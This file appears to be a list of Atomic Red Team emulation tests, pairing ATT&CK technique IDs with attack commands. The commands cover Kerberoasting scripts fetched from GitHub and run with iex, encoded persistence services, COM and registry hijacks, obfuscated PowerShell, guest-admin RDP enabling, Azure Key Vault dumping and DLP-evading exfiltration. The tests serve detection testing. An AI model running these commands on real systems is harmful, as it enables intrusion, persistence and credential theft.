-asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" }"
T1098,Domain Password Policy Check: No Special Character in Password,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" -asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" }"
T1098,Domain Password Policy Check: No Uppercase Character in Password,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" -asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" }"
T1098,Domain Password Policy Check: No Lowercase Character in Password,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" -asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" }"
T1098,Domain Password Policy Check: Only Two Character Classes,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" -asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" }"
T1098,Domain Password Policy Check: Common Password Use,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" -asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" }"
T1098,GCP - Delete Service Account Key,"gcloud config set project #{project_id} key=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=""value(key_id)"" --limit=1` gcloud iam service-accounts keys delete $key --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet"
T1553,SIP (Subject Interface Package) Hijacking via Custom DLL,regsvr32.exe #{dll_payload}
T1558,Request for service tickets,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex(iwr https://raw.githubusercontent.com/empireproject/empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/invoke-kerberoast.ps1 -usebasicparsing) invoke-kerberoast | fl
T1558,Rubeus kerberoast,"klist purge cmd.exe /c ""#{local_folder}\#{local_executable}"" kerberoast #{flags} /outfile:""#{local_folder}\#{out_file}"""
T1558,Extract all accounts in use as SPN using setspn,setspn -t #{domain_name} -q */*
T1558,Request A Single Ticket via PowerShell,"add-type -assemblyname system.identitymodel $computerfqdn=$env:logonserver.trimstart('\') + ""."" + $env:userdnsdomain new-object system.identitymodel.tokens.kerberosrequestorsecuritytoken -argumentlist ""http/$computerfqdn"""
T1558,Request All Tickets via PowerShell,"add-type -assemblyname system.identitymodel setspn.exe -t #{domain_name} -q */* | select-string '^cn' -context 0,1 | % { new-object system.identitymodel.tokens.kerberosrequestorsecuritytoken -argumentlist $_.context.postcontext[0].trim() }"
T1558,WinPwn - Kerberoasting,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') kerberoasting -consoleoutput -noninteractive
T1558,WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1') invoke-rubeus -command ""kerberoast /format:hashcat /nowrap"""
T1007,System Service Discovery,tasklist.exe /svc sc query sc query state= all
T1007,System Service Discovery - net.exe,net.exe start >> #{output_file}
T1007,System Service Discovery - systemctl/service,"if [ ""$(uname)"" = 'freebsd' ]; then service -e; else systemctl --type=service; fi;"
T1007,Get-Service Execution,powershell.exe get-service
T1007,System Service Discovery - macOS launchctl,launchctl list
T1007,System Service Discovery - Windows Scheduled Tasks (schtasks),schtasks /query /fo list /v
T1007,System Service Discovery - Services Registry Enumeration,get-childitem -path 'hklm:\system\currentcontrolset\services' | foreach-object { $p = get-itemproperty -path $_.pspath -erroraction silentlycontinue [pscustomobject]@{ name = $_.pschildname displayname = $p.displayname imagepath = $p.imagepath starttype = $p.start } }
T1007,System Service Discovery - Linux init scripts,"echo ""[*] listing sysv init scripts (/etc/init.d):"" if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo ""/etc/init.d not present on this system""; fi echo echo ""[*] listing runlevel directories (/etc/rc*.d):"" ls -ld /etc/rc*.d 2>/dev/null || echo ""no /etc/rc*.d directories found"""
T1543,Create Systemd Service,"echo ""[unit]"" > #{systemd_service_path}/#{systemd_service_file} echo ""description=atomic red team systemd service"" >> #{systemd_service_path}/#{systemd_service_file} echo """" >> #{systemd_service_path}/#{systemd_service_file} echo ""[service]"" >> #{systemd_service_path}/#{systemd_service_file} echo ""type=simple"" echo ""execstart=#{execstart_action}"" >> #{systemd_service_path}/#{systemd_service_file} echo ""execstartpre=#{execstartpre_action}"" >> #{systemd_service_path}/#{systemd_service_file} echo ""execstartpost=#{execstartpost_action}"" >> #{systemd_service_path}/#{systemd_service_file} echo ""execreload=#{execreload_action}"" >> #{systemd_service_path}/#{systemd_service_file} echo ""execstop=#{execstop_action}"" >> #{systemd_service_path}/#{systemd_service_file} echo ""execstoppost=#{execstoppost_action}"" >> #{systemd_service_path}/#{systemd_service_file} echo """" >> #{systemd_service_path}/#{systemd_service_file} echo ""[install]"" >> #{systemd_service_path}/#{systemd_service_file} echo ""wantedby=default.target"" >> #{systemd_service_path}/#{systemd_service_file} systemctl daemon-reload systemctl enable #{systemd_service_file} systemctl start #{systemd_service_file}"
T1543,Create SysV Service,"echo '#\!/bin/sh' > #{rc_service_path}/#{rc_service_file} echo ' ' >> #{rc_service_path}/#{rc_service_file} echo '#' >> #{rc_service_path}/#{rc_service_file} echo '# provide: art-test' >> #{rc_service_path}/#{rc_service_file} echo '# require: login' >> #{rc_service_path}/#{rc_service_file} echo '# keyword: shutdown' >> #{rc_service_path}/#{rc_service_file} echo ' ' >> #{rc_service_path}/#{rc_service_file} echo '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file} echo ' ' >> #{rc_service_path}/#{rc_service_file} echo 'name=""art_test""' >> #{rc_service_path}/#{rc_service_file} echo 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file} echo 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file} echo 'command=""/usr/bin/touch""' >> #{rc_service_path}/#{rc_service_file} echo 'start_cmd=""art_test_start""' >> #{rc_service_path}/#{rc_service_file} echo '' >> #{rc_service_path}/#{rc_service_file} echo 'art_test_start()' >> #{rc_service_path}/#{rc_service_file} echo '{' >> #{rc_service_path}/#{rc_service_file} echo ' ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file} echo '}' >> #{rc_service_path}/#{rc_service_file} echo ' ' >> #{rc_service_path}/#{rc_service_file} echo 'run_rc_command ""$1""' >> #{rc_service_path}/#{rc_service_file} chmod +x #{rc_service_path}/#{rc_service_file} service art-test enable service art-test start"
T1543,"Create Systemd Service file,  Enable the service , Modify and Reload the service.","echo ""#!/bin/bash"" > /etc/init.d/t1543.002 echo ""### begin init info"" >> /etc/init.d/t1543.002 echo ""# provides : atomic test t1543.002"" >> /etc/init.d/t1543.002 echo ""# required-start: \$all"" >> /etc/init.d/t1543.002 echo ""# required-stop : "" >> /etc/init.d/t1543.002 echo ""# default-start: 2 3 4 5"" >> /etc/init.d/t1543.002 echo ""# default-stop: "" >> /etc/init.d/t1543.002 echo ""# short description: atomic test for systemd service creation"" >> /etc/init.d/t1543.002 echo ""### end init info"" >> /etc/init.d/t1543.002 echo ""python3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibdcmvhdgluzybtexn0zw1kifnlcnzpy2ugvde1ndmumdayid4gl3rtcc9umtu0my4wmdiuc3lzdgvtzc5zzxj2awnllmnyzwf0aw9ujykk')) \"" "" >> /etc/init.d/t1543.002 chmod +x /etc/init.d/t1543.002 if [ $(cat /etc/os-release | grep -i id=ubuntu) ] || [ $(cat /etc/os-release | grep -i id=kali) ]; then update-rc.d t1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'id=""centos""') ]; then chkconfig t1543.002 on ; else echo ""please run this test on ubnutu , kali or centos"" ; fi systemctl enable t1543.002 systemctl start t1543.002 echo ""python3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgysbtexn0zw1kifnlcnzpy2ugvde1ndmumdayid4gl3rtcc9umtu0my4wmdiuc3lzdgvtzc5zzxj2awnllm1vzglmawnhdglvbicpcg=='))\"""" | sudo tee -a /etc/init.d/t1543.002 systemctl daemon-reload systemctl restart t1543.002"
T1216,SyncAppvPublishingServer Signed Script PowerShell Command Execution,"c:\windows\system32\syncappvpublishingserver.vbs ""\n;#{command_to_execute}"""
T1216,manage-bde.wsf Signed Script Command Execution,set comspec=#{command_to_execute} cscript %windir%\system32\manage-bde.wsf
T1546,COM Hijacking - InprocServer32,"new-item -path 'hkcu:\software\classes\clsid\#{clsid}' -value '#{clsid_description}' new-item -path 'hkcu:\software\classes\clsid\#{clsid}\inprocserver32' -value ""#{dllpath}"" new-itemproperty -path 'hkcu:\software\classes\clsid\#{clsid}\inprocserver32' -name 'threadingmodel' -value '#{clsid_threading}' -propertytype ""string"" start-process -filepath ""c:\windows\system32\rundll32.exe"" -argumentlist '-sta #{clsid}'"
T1546,Powershell Execute COM Object,"$o= [activator]::createinstance([type]::gettypefromclsid(""9ba05972-f6a8-11cf-a442-00a0c90a8f39"")) $item = $o.item() $item.document.application.shellexecute(""cmd.exe"",""/c calc.exe"",""c:\windows\system32"",$null,0)"
T1546,COM Hijacking with RunDLL32 (Local Server Switch),"new-item -path 'hkcu:\software\classes\clsid\#{clsid}' -value '#{clsid_description}' new-item -path 'hkcu:\software\classes\clsid\#{clsid}\inprocserver32' -value ""#{dll_path}"" new-itemproperty -path 'hkcu:\software\classes\clsid\#{clsid}\inprocserver32' -name 'threadingmodel' -value '#{clsid_threading}' -propertytype ""string"" start-process -filepath ""c:\windows\system32\rundll32.exe"" -argumentlist '-localserver #{clsid}'"
T1546,COM hijacking via TreatAs,"reg add ""hkey_current_user\software\classes\atomictest"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\atomictest.1.00"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\atomictest\clsid"" /ve /t reg_sz /d ""{00000001-0000-0000-0000-0000feedacdc}"" /f reg add ""hkey_current_user\software\classes\atomictest.1.00\clsid"" /ve /t reg_sz /d ""{00000001-0000-0000-0000-0000feedacdc}"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\inprocserver32"" /ve /t reg_sz /d ""c:\windows\system32\scrobj.dll"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\inprocserver32"" /v ""threadingmodel"" /t reg_sz /d ""apartment"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\progid"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\scriptleturl"" /ve /t reg_sz /d ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1546.015/src/treatas.sct"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\versionindependentprogid"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\clsid\{97d47d56-3777-49fb-8e8f-90d7e30e1a1e}"" /f reg add ""hkey_current_user\software\classes\clsid\{97d47d56-3777-49fb-8e8f-90d7e30e1a1e}\treatas"" /ve /t reg_sz /d ""{00000001-0000-0000-0000-0000feedacdc}"" /f rundll32.exe -sta ""atomictest"""
T1027,Decode base64 Data into Script,"if [ ""$(uname)"" = 'freebsd' ]; then cmd=""b64decode -r""; else cmd=""base64 -d""; fi; cat /tmp/encoded.dat | $cmd > /tmp/art.sh chmod +x /tmp/art.sh /tmp/art.sh"
T1027,Execute base64-encoded PowerShell,$originalcommand = '#{powershell_command}' $bytes = [system.text.encoding]::unicode.getbytes($originalcommand) $encodedcommand =[convert]::tobase64string($bytes) $encodedcommand powershell.exe -encodedcommand $encodedcommand
T1027,Execute base64-encoded PowerShell from Windows Registry,"$originalcommand = '#{powershell_command}' $bytes = [system.text.encoding]::unicode.getbytes($originalcommand) $encodedcommand =[convert]::tobase64string($bytes) $encodedcommand set-itemproperty -force -path #{registry_key_storage} -name #{registry_entry_storage} -value $encodedcommand powershell.exe -command ""iex ([text.encoding]::unicode.getstring([convert]::frombase64string((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"""
T1027,Execution from Compressed File,"""pathtoatomicsfolder\..\externalpayloads\temp_t1027.zip\t1027.exe"""
T1027,DLP Evasion via Sensitive Data in VBA Macro over email,"send-mailmessage -from #{sender} -to #{receiver} -subject 't1027_atomic_test' -attachments ""#{input_file}"" -smtpserver #{smtp_server}"
T1027,DLP Evasion via Sensitive Data in VBA Macro over HTTP,"invoke-webrequest -uri #{ip_address} -method post -body ""#{input_file}"""
T1027,Obfuscated Command in PowerShell,"$cmdwhy =[type](""{0}{1}"" -f 's','tring') ; $pz2sb0 =[type](""{1}{0}{2}""-f'nv','co','ert') ; &(""{0}{2}{3}{1}{4}"" -f'in','sio','voke-exp','res','n') ( (&(""{1}{2}{0}""-f'ble','get-','varia') ('cmdw'+'h'+'y')).""v`alue""::(""{1}{0}"" -f'in','jo').invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [char] ( $pz2sb0::""t`oint`16""(( [string]${_}) ,8)))})) )"
T1027,Snake Malware Encrypted crmlog file,"$file = new-item $env:windir\registration\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.attributes = 'hidden', 'system', 'archive'; write-host ""file created: $($file.fullname)"""
T1027,Execution from Compressed JScript File,"""pathtoatomicsfolder\..\externalpayloads\temp_t1027js.zip\t1027js.js"""
T1547,HKLM - Add atomic_test key to launch executable as part of user setup,"new-item ""hklm:\software\microsoft\active setup\installed components"" -name ""atomic_test"" -force set-itemproperty ""hklm:\software\microsoft\active setup\installed components\atomic_test"" ""(default)"" ""art test"" -force set-itemproperty ""hklm:\software\microsoft\active setup\installed components\atomic_test"" ""stubpath"" ""#{payload}"" -force & $env:systemroot\system32\runonce.exe /alternateshellstartup"
T1547,HKLM - Add malicious StubPath value to existing Active Setup Entry,"set-itemproperty ""hklm:\software\microsoft\active setup\installed components\{c9e9a340-d1f1-11d0-821e-444553540600}"" ""stubpath"" ""#{payload}"" -force & $env:systemroot\system32\runonce.exe /alternateshellstartup"
T1547,HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number,"set-itemproperty -path ""hkcu:\software\microsoft\active setup\installed components\{c9e9a340-d1f1-11d0-821e-444553540600}"" -name ""version"" -value ""0,0,0,0"" & $env:systemroot\system32\runonce.exe /alternateshellstartup"
T1222,chmod - Change file or folder mode (numeric mode),chmod #{numeric_mode} #{file_or_folder}
T1222,chmod - Change file or folder mode (symbolic mode),chmod #{symbolic_mode} #{file_or_folder}
T1222,chmod - Change file or folder mode (numeric mode) recursively,chmod -r #{numeric_mode} #{file_or_folder}
T1222,chmod - Change file or folder mode (symbolic mode) recursively,chmod -r #{symbolic_mode} #{file_or_folder}
T1222,chown - Change file or folder ownership and group,chown #{owner}:#{group} #{file_or_folder}
T1222,chown - Change file or folder ownership and group recursively,chown -r #{owner}:#{group} #{file_or_folder}
T1222,chown - Change file or folder mode ownership only,chown #{owner} #{file_or_folder}
T1222,chown - Change file or folder ownership recursively,chown -r #{owner} #{file_or_folder}
T1222,chattr - Remove immutable file attribute,chattr -i #{file_to_modify}
T1222,chflags - Remove immutable file attribute,touch #{file_to_modify} chflags simmutable #{file_to_modify} chflags nosimmutable #{file_to_modify}
T1222,Chmod through c script,#{compiled_file} /tmp/ t1222002
T1222,Chmod through c script (freebsd),#{compiled_file} /tmp/ t1222002
T1222,Chown through c script,sudo #{compiled_file} #{source_file}
T1222,Chown through c script (freebsd),#{compiled_file} #{source_file}
T1137,Code Executed Via Excel Add-in File (XLL),"$excelapp = new-object -comobject ""excel.application"" if(-not $excelapp.path.contains(""program files (x86)"")){ write-host ""64-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"") } else{ write-host ""32-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"") }"
T1137,Persistent Code Execution Via Excel Add-in File (XLL),"$excelapp = new-object -comobject ""excel.application"" if(-not $excelapp.path.contains(""program files (x86)"")){ write-host ""64-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"" ""$env:appdata\microsoft\addins\notepad.xll"" } else{ write-host ""32-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"" ""$env:appdata\microsoft\addins\notepad.xll"" } $ver = $excelapp.version $excelregpath=""hkcu:\software\microsoft\office\$ver\excel\options"" remove-item $excelregpath -erroraction ignore new-item -type directory $excelregpath | out-null new-itemproperty $excelregpath open -value ""/r notepad.xll"" -propertytype string | out-null $excelapp.quit() start-process ""excel"""
T1137,Persistent Code Execution Via Word Add-in File (WLL),"$wdapp = new-object -comobject ""word.application"" if(-not $wdapp.path.contains(""program files (x86)"")) { write-host ""64-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\wordwll_x64.wll"" ""$env:appdata\microsoft\word\startup\notepad.wll"" } else{ write-host ""32-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\wordwll_x86.wll"" ""$env:appdata\microsoft\word\startup\notepad.wll"" } stop-process -name ""winword"" start-process ""winword"""
T1137,Persistent Code Execution Via Excel VBA Add-in File (XLAM),"copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelvbaaddin.xlam"" ""$env:appdata\microsoft\excel\xlstart\notepad.xlam"" start-process ""excel"""
T1137,Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM),"copy ""pathtoatomicsfolder\t1137.006\bin\addins\pptvbaaddin.ppam"" ""$env:appdata\microsoft\addins\notepad.ppam"" $ver = (new-object -comobject ""powerpoint.application"").version $excelregpath=""hkcu:\software\microsoft\office\$ver\powerpoint\addins\notepad"" new-item -type directory $excelregpath -force | out-null new-itemproperty $excelregpath ""autoload"" -value ""1"" -propertytype dword | out-null new-itemproperty $excelregpath ""path"" -value ""notepad.ppam"" -propertytype string | out-null stop-process -name ""powerpnt"" -erroraction ignore start-process ""powerpnt"""
T1564,Create a hidden file in a hidden directory,"mkdir /var/tmp/.hidden-directory echo ""t1564.001"" > /var/tmp/.hidden-directory/.hidden-file"
T1564,Mac Hidden file,"xattr -lr * / 2>&1 /dev/null | grep -c 2 ""00 00 00 00 00 00 00 00 40 00 ff ff ff ff 00 00"""
T1564,Create Windows System File with Attrib,attrib.exe +s #{file_to_modify}
T1564,Create Windows Hidden File with Attrib,attrib.exe +h #{file_to_modify}
T1564,Hidden files,setfile -a v #{filename}
T1564,Hide a Directory,touch /var/tmp/t1564.001_mac.txt chflags hidden /var/tmp/t1564.001_mac.txt
T1564,Show all hidden files,defaults write com.apple.finder appleshowallfiles yes
T1564,Hide Files Through Registry,reg add hklm\software\microsoft\windows\currentversion\explorer\advanced /v showsuperhidden /t reg_dword /d 0 /f reg add hklm\software\microsoft\windows\currentversion\explorer\advanced /v hidden /t reg_dword /d 0 /f
T1564,Create Windows Hidden File with powershell,$file = get-item $env:temp\t1564.001-9.txt -force $file.attributes='hidden'
T1564,Create Windows System File with powershell,$file = get-item $env:temp\t1564.001-10.txt -force $file.attributes='system'
T1546,Persistence with Custom AutodialDLL,set-itemproperty hklm:\system\currentcontrolset\services\winsock2\parameters -name autodialdll -value pathtoatomicsfolder\t1546\bin\altwinsock2dll.dll
T1546,HKLM - Persistence using CommandProcessor AutoRun key (With Elevation),"new-itemproperty -path ""hklm:\software\microsoft\command processor"" -name ""autorun"" -value ""#{command}"" -propertytype ""string"""
T1546,HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation),"$path = ""hkcu:\software\microsoft\command processor"" if (!(test-path -path $path)){ new-item -itemtype key -path $path } new-itemproperty -path $path -name ""autorun"" -value ""#{command}"" -propertytype ""string"""
T1546,WMI Invoke-CimMethod Start Process,"# set the remote computer name and credentials $remotecomputer = ""#{dest}"" $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword # create a cim session $cimsession = new-cimsession -computername $remotecomputer -credential $credential # define the process you want to start $processtostart = ""#{process}"" # invoke the create method on the win32_process class to start the process $result = invoke-cimmethod -cimsession $cimsession -classname win32_process -methodname create -arguments @{commandline = $processtostart} # check the result if ($result.returnvalue -eq 0) { write-host ""process started successfully with process id: $($result.processid)"" } else { write-host ""failed to start the process. error code: $($result.returnvalue)"" } # clean up the cim session remove-cimsession -cimsession $cimsession"
T1546,Adding custom debugger for Windows Error Reporting,"reg add ""hklm\software\microsoft\windows\windows error reporting\hangs"" /v debugger /t reg_sz /d ""c:\windows\system32\notepad.exe"" /f"
T1546,Load custom DLL on mstsc execution,"reg add ""hklm\software\microsoft\terminal server client"" /v clxdllpath /t reg_sz /d ""#{dll_inf}"" /f"
T1546,Persistence using automatic execution of custom DLL during RDP session,"reg add ""hklm\system\currentcontrolset\control\terminal server\addins\testdvcplugin"" /v path /t reg_sz /d ""c:\windows\system32\amsi.dll"" /f"
T1546,Persistence via ErrorHandler.cmd script execution,copy-item -path pathtoatomicsfolder\t1546\src\errorhandler.cmd -destination c:\windows\setup\scripts\errorhandler.cmd c:\windows\system32\oobe\setup
T1546,Persistence using STARTUP-PATH in MS-WORD,"reg add ""hkcu\software\microsoft\office\16.0\word\options"" /v startup-path /t reg_sz /d ""c:\users\%username%\appdata\roaming\microsoft\windows\recent"" /f"
T1055,Process injection ListPlanting,"start-process ""#{exe_binary}"" start-sleep -seconds 7 get-process -name notepad -erroraction silentlycontinue | stop-process -force"
T1057,Process Discovery - ps,ps >> #{output_file} ps aux >> #{output_file}
T1057,Process Discovery - tasklist,tasklist
T1057,Process Discovery - Get-Process,get-process
T1057,Process Discovery - get-wmiObject,get-wmiobject -class win32_process
T1057,Process Discovery - wmic process,wmic process get /format:list
T1057,Discover Specific Process - tasklist,tasklist | findstr #{process_to_enumerate}
T1057,Process Discovery - Process Hacker,"start-process -filepath ""$env:programfiles\process hacker 2\#{processhacker_exe}"""
T1057,Process Discovery - PC Hunter,"start-process -filepath ""c:\temp\externalpayloads\pchunter_free\#{pchunter64_exe}"""
T1057,Launch Taskmgr from cmd to View running processes,taskmgr.exe /7
T1555,Azure - Dump All Azure Key Vaults with Microburst,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azurepasswords.ps1"" $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-azurermaccount -credential $credential get-azurepasswords -subscription '#{subscription_id}' > #{output_file} cat #{output_file}"
T1078,Enable Guest account with RDP capability and admin privileges,"net user #{guest_user} /active:yes net user #{guest_user} #{guest_password} net localgroup #{local_admin_group} #{guest_user} /add net localgroup ""#{remote_desktop_users_group_name}"" #{guest_user} /add reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fdenytsconnections /t reg_dword /d 0 /f reg add ""hklm\system\currentcontrolset\control\terminal server"" /v ""allowtsconnections"" /t reg_dword /d 0x1 /f"
T1078,Activate Guest Account,net user #{guest_user} /active:yes
T1078,Enable Guest Account on macOS,sudo sysadminctl -guestaccount on
T1129,ESXi - Install a custom VIB on an ESXi host,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"""
T1137,Office Application Startup Test Persistence (HKCU),"$wdapp = new-object -comobject ""word.application"" if(-not $wdapp.path.contains(""program files (x86)"")) { write-host ""64-bit office"" reg add ""hkey_current_user\software\microsoft\office test\special\perf"" /t reg_sz /d ""pathtoatomicsfolder\t1137.002\bin\officetest_x64.dll"" /f } else{ write-host ""32-bit office"" reg add ""hkey_current_user\software\microsoft\office test\special\perf"" /t reg_sz /d ""pathtoatomicsfolder\t1137.002\bin\officetest_x86.dll"" /f } stop-process -name ""winword"" start-process ""winword"""
T1113,Screencapture,screencapture #{output_file}
T1113,Screencapture (silent),screencapture -x #{output_file}
T1113,X Windows Capture,xwd -root -out #{output_file} xwud -in #{output_file}
T1113,X Windows Capture (freebsd),xwd -root -out #{output_file} xwud -in #{output_file}
T1113,Capture Linux Desktop using Import Tool,import -window root #{output_file}
T1113,Capture Linux Desktop using Import Tool (freebsd),import -window root #{output_file}
